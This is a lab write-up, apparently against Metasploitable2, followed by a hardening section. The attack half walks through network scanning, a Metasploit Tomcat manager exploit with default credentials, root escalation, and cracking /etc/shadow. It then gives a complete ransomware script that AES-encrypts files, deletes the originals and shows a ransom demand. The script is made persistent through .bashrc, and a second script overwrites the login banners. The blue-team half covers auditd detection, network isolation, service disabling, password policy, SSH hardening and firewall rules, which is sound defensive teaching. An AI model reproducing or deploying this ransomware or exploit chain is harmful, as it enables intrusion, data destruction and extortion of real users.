# Documentation

## Attacker Machine :

nano [hackthenetwork.sh](http://hackthenetwork.sh) (Network Scanning )

```bash
#!/bin/bash

# Simple Network Scanner
# Scans a /24 network and checks for live hosts using ping

read -p "Enter the network address to scan (e.g., 192.168.80): " netid

echo "Scanning network: $netid.0/24"
echo "--------------------------------"

for host in {1..254}
do
    ping -c 1 -W 1 "$netid.$host" &> /dev/null

    if [ $? -eq 0 ]; then
        echo "$netid.$host is LIVE"
    fi
done

echo "--------------------------------"
echo "Scan completed."
```

sudo chmod +x  [hackthenetwork.sh](http://hackthenetwork.sh)

sudo ./hackthenetwork.sh

### Output :-

![image.png](image.png)

### Port Scanning :

```bash
sudo nmap -sS -sV -O 192.168.80.148
```

### Output :-

screenshots/image.png
![image.png](image%202.png)

```bash
sudo msfconsole
```

![image.png](image%203.png)

```bash
search apache tomcat
```

![image.png](image%204.png)

```bash
use exploit/multi/http/tomcat_mgr_deploy
```

![image.png](image%205.png)

```bash
set rhosts 192.168.80.148
set rport 8180
set HttpPassword tomcat
set HttpUsername tomcat
```

The Default Username and Passwords for tomcat :

![image.png](image%206.png)

```bash
exploit
```

— we have got a meterpreter session 

![image.png](image%207.png)

but got tomcat user session now we want to do previllege escalation

```bash
background
use exploit/linux/local/udev_netlink 
set SESSION 1
meterpreter> shell
whoami
```

![image.png](image%208.png)

Got the root access :

### Now to share the file we require the username and password of msfadmin user

for this cat /etc/passwd and save the output also cat /etc/shadow and save the output 

### Password Cracking :

```bash
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

![image.png](image%209.png)

### Ransomeware Script :

```bash
#!/bin/bash
set -e

SCRIPT_NAME="$(basename "$0")"
KEY_FILE="thekey.key"
SECRET_PHRASE="mr_robot"

files=()

# ------------------ ENCRYPTION PHASE ------------------

for file in *; do
    [[ -f "$file" ]] || continue

    # Exclusions
    if [[ "$file" == "$SCRIPT_NAME" || "$file" == "$KEY_FILE" || "$file" == *.enc ]]; then
        continue
    fi

    files+=("$file")
done

if [[ ${#files[@]} -eq 0 ]]; then
    echo "No files to encrypt."
    exit 0
fi

echo "Files detected:"
echo "[${files[*]}]"
echo

# Generate key only once
if [[ ! -f "$KEY_FILE" ]]; then
    echo "Generating AES-256 key..."
    openssl rand 32 > "$KEY_FILE"
else
    echo "Using existing key."
fi

echo
for file in "${files[@]}"; do
    echo "Encrypting: $file"

    openssl enc -aes-256-cbc \
        -salt \
        -md sha256 \
        -in "$file" \
        -out "$file.enc" \
        -pass file:"$KEY_FILE"

    rm -f "$file"
done

echo
echo "ALL FILES ENCRYPTED SUCCESSFULLY"
sleep 2

# ------------------ BANNER ------------------

clear
echo "=============================================="
echo "  YOUR FILES ARE ENCRYPTED BY HANDSOMWARE"
echo
echo "  If you want to decrypt then contact"
echo "  pushpak3504 for secret phrase"
echo "=============================================="
echo

# ------------------ DECRYPTION PHASE ------------------

read -s -p "Enter the Secret Phrase to Decrypt Your Files: " USER_PHRASE
echo

if [[ "$USER_PHRASE" != "$SECRET_PHRASE" ]]; then
    echo "Sorry, Wrong Secret Phrase"
    exit 1
fi

echo
echo "Secret phrase verified."
echo "Starting decryption..."
echo

found=false

for file in *.enc; do
    [[ -f "$file" ]] || continue
    found=true

    original="${file%.enc}"
    echo "Decrypting: $file"

    openssl enc -d -aes-256-cbc \
        -md sha256 \
        -in "$file" \
        -out "$original" \
        -pass file:"$KEY_FILE"

    rm -f "$file"
done

if [[ "$found" = false ]]; then
    echo "No encrypted files found."
    exit 0
fi

echo
echo "Congratulations, Your Files are Decrypted. Enjoy!!"

```

### Banner Change File :

```bash
#!/bin/bash
set -e

ISSUE_FILE="/etc/issue"
MOTD_FILE="/etc/motd"

# Root check
if [[ "$EUID" -ne 0 ]]; then
  echo "Run as root"
  exit 1
fi

cat << 'EOF' > /tmp/handsomeware_banner.txt

 ██╗  ██╗ █████╗ ███╗   ██╗██████╗ ███████╗ ██████╗ ███╗   ███╗███████╗
 ██║  ██║██╔══██╗████╗  ██║██╔══██╗██╔════╝██╔═══██╗████╗ ████║██╔════╝
 ███████║███████║██╔██╗ ██║██║  ██║███████╗██║   ██║██╔████╔██║█████╗  
 ██╔══██║██╔══██║██║╚██╗██║██║  ██║╚════██║██║   ██║██║╚██╔╝██║██╔══╝  
 ██║  ██║██║  ██║██║ ╚████║██████╔╝███████║╚██████╔╝██║ ╚═╝ ██║███████╗
 ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝

──────────────────────────────────────────────────────────────────────
                H A N D S O M E W A R E   A T T A C K
──────────────────────────────────────────────────────────────────────

   Hello, friend.
   Your files are encrypted.
   Control is an illusion.

   Host : $(hostname)
   Time : $(date)

──────────────────────────────────────────────────────────────────────

EOF

# Apply banner
cp /tmp/handsomeware_banner.txt "$ISSUE_FILE"
cp /tmp/handsomeware_banner.txt "$MOTD_FILE"
rm -f /tmp/handsomeware_banner.txt

```

### Now FTP INTO Victim Machine

```bash
ftp msfadmin@192.168.80.148
put handsomeware.sh
put handsomeBanner.sh 
```

![image.png](image%2010.png)

### Now in Our MSFCONSOLE SESSION

```bash
cd /home/msfadmin
ls
chmod +x handsomeBanner.sh
chmod +x handsomeware.sh
./handsomeBanner.sh
touch .bashrc
echo "/home/msfadmin/handsomeware.sh" >> /home/msfadmin/.bashrc
```

![image.png](image%2011.png)

## Now When the User Reboots the Victim Machine

![image.png](image%2012.png)

![image.png](image%2013.png)

### Ransomeware attack successfull!!!!

# Blue Teaming :

### Creating a Bash the monitors file integrity using auditd and isolates your machine from internet if ransomeware attack happens

```bash
sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak
sudo nano /etc/apt/sources.list

deb http://old-releases.ubuntu.com/ubuntu/ hardy main restricted universe multiverse
deb http://old-releases.ubuntu.com/ubuntu/ hardy-updates main restricted universe multiverse
deb http://old-releases.ubuntu.com/ubuntu/ hardy-security main restricted universe multiverse

sudo apt-get clean
sudo apt-get update

sudo apt-get install auditd -y 
sudo apt-get install iptables -y
sudo apt-get install audispd-plugins -y

sudo /sbin/auditd
sudo auditctl -s #--> to verify if is it working enabled=1
sudo mkdir -p /opt/defense
sudo chmod 755 /opt/defense
sudo nano /opt/defense/audit_guard_daemon.sh

```

```bash
#!/bin/bash
# =====================================================
# Auditd-based Ransomware Guard (Daemon)
# Detects rapid file write activity
# =====================================================

AUDIT_LOG="/var/log/audit/audit.log"
KEY="ransomware_detect"

THRESHOLD=20
WINDOW=10

LOCKFILE="/tmp/.network_isolated"
LOGFILE="/var/log/ransomware_guard.log"

count=0
start_time=0

log() {
    echo "$(date '+%F %T') : $1" >> "$LOGFILE"
}

isolate() {
    [ -f "$LOCKFILE" ] && return

    log "THRESHOLD HIT — isolating network"

    iptables -P INPUT DROP
    iptables -P OUTPUT DROP
    iptables -P FORWARD DROP

    touch "$LOCKFILE"
    log "Network isolation complete"
}

log "Ransomware audit daemon started"

tail -F "$AUDIT_LOG" | while read line; do
    echo "$line" | grep -q "$KEY" || continue

    now=$(date +%s)

    if (( start_time == 0 || now - start_time > WINDOW )); then
        start_time=$now
        count=0
    fi

    ((count++))

    if (( count >= THRESHOLD )); then
        isolate
        exit 0
    fi
done

```

```bash
sudo chmod +x /opt/defense/audit_guard_daemon.sh
sudo auditctl -D
sudo auditctl -w /home/msfadmin -p wa -k ransomware_detect
sudo auditctl -l
```

Make Rule Persistent :

```bash
sudo sh -c 'cat > /etc/audit.rules << EOF
-D
-w /home/msfadmin -p wa -k ransomware_detect
EOF'
```

```bash
sudo nano /etc/init.d/audit-ransomware-guard
```

```bash
#!/bin/sh
### BEGIN INIT INFO
# Provides:          audit-ransomware-guard
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Auditd ransomware protection daemon
### END INIT INFO

DAEMON="/opt/defense/audit_guard_daemon.sh"
PIDFILE="/var/run/audit_guard.pid"

start() {
    echo "[+] Starting audit ransomware guard"
    start-stop-daemon --start --background \
        --make-pidfile --pidfile "$PIDFILE" \
        --exec "$DAEMON"
}

stop() {
    echo "[-] Stopping audit ransomware guard"
    start-stop-daemon --stop --pidfile "$PIDFILE"
}

case "$1" in
    start) start ;;
    stop) stop ;;
    restart) stop; start ;;
    status)
        [ -f "$PIDFILE" ] && echo "Running" || echo "Stopped"
        ;;
    *)
        echo "Usage: $0 {start|stop|restart|status}"
        exit 1
        ;;
esac

exit 0

```

```bash
sudo chmod +x /etc/init.d/audit-ransomware-guard
sudo update-rc.d audit-ransomware-guard defaults
ls /etc/rc2.d | grep audit #--> verify
```

```bash
sudo nano /etc/rc.local
```

### Add BEFORE `exit 0`

```bash
/sbin/auditd
/sbin/auditctl -R /etc/audit.rules
```

```bash
sudo chmod +x /etc/rc.local
sudo /sbin/auditd
sudo /etc/init.d/audit-ransomware-guard start

```

## After the Ransomeware attack putty stoped working and the machine is isolated from the internet successfully!!

![image.png](image%2014.png)

![image.png](image%2015.png)

### Additional Steps to SafeGuard Your Victim Machine :

CIS SECTION 2 — SERVICE MINIMIZATION (SAFE LIST)

### ❌ SERVICES SAFE TO DISABLE (YOU DID THIS RIGHT)

| Service | Reason | Command |
| --- | --- | --- |
| vsftpd | Backdoored FTP | `update-rc.d -f vsftpd remove` |
| telnet | Cleartext auth | `update-rc.d -f telnet remove` |
| rsh / rexec / rlogin | Trust-based auth | `update-rc.d -f rsh remove` |
| smbd / nmbd | Anonymous shares | `update-rc.d -f smbd remove` |
| bind9 | Unused DNS | `update-rc.d -f bind9 remove` |
| rpcbind / nfs | Remote FS | `update-rc.d -f rpcbind remove` |
| inetd | Multiple backdoors | `update-rc.d -f inetd remove` |
| proftpd | Insecure FTP | `update-rc.d -f proftpd remove` |
| mysql / postgres | DB exposure | `update-rc.d -f mysql remove` |
| unrealircd | Backdoored IRC | `update-rc.d -f unrealircd remove` |
| tomcat6 | RCE risk | `update-rc.d -f tomcat6 remove` |
| postfix | Unused mail | `update-rc.d -f postfix remove` |

🔐 CIS PASSWORD POLICY (LEGACY-SAFE IMPLEMENTATION)

```bash
sudo cp /etc/pam.d/common-password /etc/pam.d/common-password.bak
sudo cp /etc/login.defs /etc/login.defs.bak
sudo nano /etc/pam.d/common-password
```

### Find this line (or similar):

```
passwordrequired   pam_unix.so nullok obscure md5
```

---

### REPLACE IT with this :

```
passwordrequired pam_unix.so obscure sha512 minlen=12 remember=5
```

| Option | Effect |
| --- | --- |
| `sha512` | Strong hashing |
| `minlen=12` | Minimum password length |
| `obscure` | Blocks simple passwords |
| `remember=5` | Prevents reuse of last 5 passwords |

```bash
sudo nano /etc/login.defs

replace ::

PASS_MAX_DAYS   90
PASS_MIN_DAYS   7
PASS_WARN_AGE   14
```

### Meaning

| Setting | Purpose |
| --- | --- |
| `PASS_MAX_DAYS 90` | Password expires every 90 days |
| `PASS_MIN_DAYS 7` | Must wait 7 days before changing |
| `PASS_WARN_AGE 14` | Warning 14 days before expiry |

```bash
sudo chage -M 90 -m 7 -W 14 msfadmin --> this we have to do manually
sudo chage -l msfadmin -> verify
Last password change                                    : Mar 16, 2010
Password expires                                        : Jun 14, 2010
Password inactive                                       : never
Account expires                                         : never
Minimum number of days between password change          : 7
Maximum number of days between password change          : 90
Number of days of warning before password expires       : 14
```

### apache2 disable dir browsing

```bash
sudo nano /etc/apache2/apache2.conf
```

```bash
<Directory /var/www/>
    Options -Indexes +FollowSymLinks
    AllowOverride None
    Order allow,deny
    Allow from all
</Directory>
```

add this at the end of file 

### SSH HARDENING

```bash
sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
sudo nano /etc/ssh/sshd_config
```

```bash
# =========================================================
# Hardened OpenSSH Configuration (CIS-aligned, legacy-safe)
# Target: Ubuntu 8.04 / OpenSSH 4.7 (Metasploitable2)
# =========================================================

# Network
Port 22
Protocol 2
ListenAddress 0.0.0.0

# Host keys (protocol 2 only)
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_dsa_key

# Privilege separation
UsePrivilegeSeparation yes

# Logging
SyslogFacility AUTH
LogLevel VERBOSE

# Authentication controls
LoginGraceTime 30
MaxAuthTries 3
PermitRootLogin no
PermitEmptyPasswords no
StrictModes yes

# Authentication methods
RSAAuthentication yes
PubkeyAuthentication yes
PasswordAuthentication yes
ChallengeResponseAuthentication no

# Disable legacy trust mechanisms
IgnoreRhosts yes
RhostsRSAAuthentication no
HostbasedAuthentication no

# Session restrictions
X11Forwarding no
AllowTcpForwarding no
TCPKeepAlive yes
PrintMotd no
PrintLastLog yes
UseDNS no

# Limit access to specific users
AllowUsers msfadmin

# Environment
AcceptEnv LANG LC_*

# SFTP subsystem (keep enabled)
Subsystem sftp /usr/lib/openssh/sftp-server

# PAM integration
UsePAM yes

# =========================================================
# End of configuration
# =========================================================

```

```bash
sudo /etc/init.d/ssh restart
```

## Extra Layer of Security By Introducing Firewall machine :

```bash
nano fw_metasploitable_protect.sh
```

```bash
#!/bin/bash
# ==================================================
# Firewall + Apache Port Forwarding for Metasploitable
# ==================================================

# -------------------------------
# VARIABLES
# -------------------------------
FW_EXT_IP="192.168.80.100"     # Firewall external IP
FW_INT_IP="192.168.40.100"     # Firewall internal IP
TARGET_IP="192.168.40.10"      # Metasploitable IP
LAN_NET="192.168.80.0/24"

echo "[+] Enabling IP forwarding"
echo 1 > /proc/sys/net/ipv4/ip_forward

# -------------------------------
# FLUSH OLD RULES
# -------------------------------
echo "[+] Flushing old rules"
iptables -F
iptables -t nat -F
iptables -X

# -------------------------------
# DEFAULT POLICIES (ZERO TRUST)
# -------------------------------
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# -------------------------------
# BASIC ALLOW RULES
# -------------------------------

# Loopback
iptables -A INPUT -i lo -j ACCEPT

# Established / Related
iptables -A INPUT   -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow SSH to firewall (management)
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# -------------------------------
# 🔥 APACHE PORT FORWARDING (DNAT)
# -------------------------------

# Forward HTTP from firewall external IP → metasploitable
iptables -t nat -A PREROUTING -p tcp -d $FW_EXT_IP --dport 80 \
-j DNAT --to-destination $TARGET_IP:80

# Allow forwarded HTTP traffic
iptables -A FORWARD -p tcp -d $TARGET_IP --dport 80 \
-m state --state NEW,ESTABLISHED,RELATED -j ACCEPT

# Allow return traffic from metasploitable
iptables -A FORWARD -p tcp -s $TARGET_IP --sport 80 \
-m state --state ESTABLISHED,RELATED -j ACCEPT

# -------------------------------
# SSH ACCESS TO METASPLOITABLE
# (ONLY VIA FIREWALL)
# -------------------------------

iptables -A FORWARD -p tcp -s $FW_INT_IP -d $TARGET_IP --dport 22 -j ACCEPT

# SSH brute-force protection
iptables -A FORWARD -p tcp -d $TARGET_IP --dport 22 \
-m state --state NEW -m recent --set --name SSH

iptables -A FORWARD -p tcp -d $TARGET_IP --dport 22 \
-m state --state NEW -m recent --update --seconds 60 --hitcount 4 --name SSH -j DROP

# -------------------------------
# BLOCK NMAP SCANS (TARGET ONLY)
# -------------------------------

iptables -A FORWARD -p tcp -d $TARGET_IP --tcp-flags ALL NONE -j DROP
iptables -A FORWARD -p tcp -d $TARGET_IP --tcp-flags ALL FIN -j DROP
iptables -A FORWARD -p tcp -d $TARGET_IP --tcp-flags ALL FIN,PSH,URG -j DROP

# -------------------------------
# ICMP RATE LIMITING
# -------------------------------

iptables -A FORWARD -p icmp -d $TARGET_IP --icmp-type echo-request \
-m limit --limit 1/s --limit-burst 2 -j ACCEPT

iptables -A FORWARD -p icmp -d $TARGET_IP -j DROP

# -------------------------------
# DROP INVALID PACKETS
# -------------------------------

iptables -A FORWARD -m state --state INVALID -j DROP

# -------------------------------
# LOG DROPPED PACKETS
# -------------------------------

iptables -A FORWARD -m limit --limit 5/min -j LOG \
--log-prefix "FW-DROP: " --log-level 4

# -------------------------------
# SAVE RULES (PERSISTENT)
# -------------------------------

iptables-save > /etc/iptables.rules

cat <<EOF > /etc/network/if-pre-up.d/iptables
#!/bin/sh
iptables-restore < /etc/iptables.rules
EOF

chmod +x /etc/network/if-pre-up.d/iptables

echo "[+] Firewall deployed successfully"

```

```bash
sudo chmod +x fw_metasploitable_protect.sh
sudo ./fw_metasploitable_protect.sh
```

![image.png](image%2016.png)
